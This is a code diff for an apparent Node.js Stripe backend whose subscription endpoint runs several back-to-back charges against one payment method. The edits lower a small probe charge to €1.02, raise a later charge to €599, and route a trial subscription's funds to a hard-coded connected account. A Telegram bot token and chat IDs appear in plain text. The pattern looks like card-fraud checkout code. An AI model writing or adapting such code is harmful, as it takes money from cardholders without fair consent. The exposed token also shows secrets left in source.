@@ -5,7 +5,7 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 
 const app = express();
-const ACCOUNT_B = 'acct_1T3SzcKnYIJcJ1dB';
+const ACCOUNT_B = 'acct_1RURIXJ4lPo0Pf67';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -112,10 +112,10 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Charge 1 — €32.67
+    // Charge 1 — €1.02
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 3267,
+        amount: 102,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -152,10 +152,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €499
+    // Charge 3 — €599
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 49900,
+        amount: 59900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -175,7 +175,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1T4K7gHPssRUHyrour90urJj' }],
+      items: [{ price: 'price_1T4hldBzXqhIraFc8FKBeVDj' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
